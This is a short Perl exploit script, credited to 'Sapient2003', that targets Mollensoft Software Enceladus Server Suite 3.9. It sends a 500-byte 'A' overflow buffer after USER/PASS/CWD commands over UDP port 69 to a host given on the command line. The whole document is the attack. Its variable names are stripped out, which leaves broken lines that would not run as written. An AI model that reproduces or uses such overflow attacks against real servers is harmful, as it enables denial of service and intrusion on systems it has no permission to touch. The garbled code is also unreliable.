
#!/usr/bin/perl -w



use IO::Socket;



 = "Mollensoft Software Enceladus Server Suite 3.9";



unless (@ARGV == 3) {

 print "\n By Sapient2003\n";

 die "usage: -bash <host to exploit> <user> <password>\n";

}

print "\n By Sapient2003\n";



 = "A" x 500;

 = "USER [1]\nPASS [2]\nCWD ";



 = IO::Socket::INET->new(

        PeerAddr => [0],

        PeerPort => 69,

        Proto    => "udp",

) or die "Can't find host [0]\n";

print  ;

print "Attempted to exploit [0]\n";

close();
